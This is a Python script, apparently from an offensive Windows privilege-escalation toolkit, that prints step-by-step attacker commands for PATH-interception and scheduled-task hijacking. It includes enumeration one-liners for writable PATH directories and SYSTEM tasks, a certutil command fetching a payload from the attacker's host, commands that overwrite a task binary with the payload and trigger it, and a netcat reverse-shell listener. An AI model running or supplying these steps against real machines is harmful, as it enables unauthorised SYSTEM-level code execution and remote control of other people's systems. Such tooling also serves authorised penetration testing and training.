#!/usr/bin/env python3
"""WINDOWS MISCONFIG ACTIONING — PATH interception + scheduled-task abuse.
The parity partner to the Linux gen_misc.py (pathhijack/cron). Both run YOUR binary as SYSTEM
(or the task's account). Build the exe first with gen_payload.py; this PRINTS the target-side
plant + trigger. Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  python3 gen_winmisc.py pathhijack [--name svc] [--dir "C:\\Writable\\OnPath"] [--payload C:\\Windows\\Temp\\payload.exe]
  python3 gen_winmisc.py schtask    [--mode binary|xml] [--task \\Microsoft\\...\\TaskName] [--payload ...]
"""
import sys
import _winpriv_common as P

def die(m): print(m); sys.exit(1)
def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg     = sys.argv[1] if len(sys.argv) > 1 else ""
payload = opt("--payload", f"{P.STAGE}\\payload.exe")

print("# build the payload first:  python3 gen_payload.py exe --action revshell  (or add_admin) -> compile -> deliver\n")

if arg == "pathhijack":
    name = opt("--name", "svc")          # the RELATIVE binary name a SYSTEM service/task invokes
    ddir = opt("--dir", "C:\\Writable\\Dir\\On\\Path")
    print(f"# PATH INTERCEPTION — a SYSTEM service/task launches a binary by RELATIVE name (no full path),")
    print(f"# and a directory you can WRITE sits earlier in the system %PATH% than the real binary.")
    print(f"# find it:")
    print(r'#   1) writable %PATH% dirs:  for %d in ("%PATH:;=" "%") do @icacls %d 2>nul | findstr /i "(F) (M) (W) Users Everyone Authenticated"')
    print(r'#   2) a service with a bare/relative ImagePath:  wmic service get name,pathname | findstr /iv "\" | findstr /i ".exe"')
    print(r'#   3) (procmon) a SYSTEM proc doing CreateProcess/LoadImage on a bare name resolved via PATH')
    print(f"\n# 1) plant your payload AS THE INTERCEPTED NAME in the writable early-PATH dir:")
    print(f'certutil -urlcache -f http://{P.LHOST}/payload.exe "{ddir.rstrip(chr(92))}\\{name}.exe"   REM serve: python3 -m http.server 80')
    print(f"\n# 2) trigger — restart the service/task (or wait); it resolves {name} to YOUR exe first, as SYSTEM:")
    print(f"sc stop <TheService> & sc start <TheService>")
    print(f"# ^ Windows finds {ddir}\\{name}.exe before the intended one because your dir precedes it in %PATH%.")
    print(f"# (the Windows analog of Linux `gen_misc.py pathhijack`.)")

elif arg == "schtask":
    mode = opt("--mode", "binary")
    task = opt("--task", "\\Microsoft\\Windows\\SomeTask")
    print(f"# SCHEDULED TASK abuse — a task runs as SYSTEM/an admin and either its EXE or its XML is writable by you.")
    print(f"# enumerate:  schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User Task To Run\"")
    print(f"#            (want 'Run As User: SYSTEM' + a 'Task To Run' path YOU can overwrite)\n")
    if mode == "binary":
        print(f"# WRITABLE TASK BINARY — just overwrite the exe the task launches (no task-edit rights needed):")
        print(f"# check:  icacls \"<Task To Run exe>\"   (want (W)/(M)/(F))")
        print(f'copy "<taskexe>" "<taskexe>.bak"  &  copy /y {payload} "<taskexe>"')
        print(f"# trigger (or wait for its schedule):  schtasks /run /tn \"{task}\"")
        print(f"# restore:  copy /y \"<taskexe>.bak\" \"<taskexe>\"")
    elif mode == "xml":
        print(f"# WRITABLE TASK XML — edit the <Command> in the task definition under System32\\Tasks:")
        print(f"# check:  icacls C:\\Windows\\System32\\Tasks\\{task.lstrip(chr(92))}")
        print(f'#   point <Command> at {payload} (and clear <Arguments>), then re-register:')
        print(f'#   (edit the file, then)  schtasks /run /tn "{task}"')
        print(f"# note: some builds validate the XML SD; if /run is denied, wait for the natural trigger.")
    else:
        die("--mode must be 'binary' or 'xml'")
    print(f"# ^ runs {payload} as the task's account (SYSTEM if it's a system task). Analog of Linux cron/systemd abuse.")

else:
    die("mode must be 'pathhijack' or 'schtask'")

print(f"\n# if action=revshell:  nc -lvnp {P.LPORT} on the attacker first.")
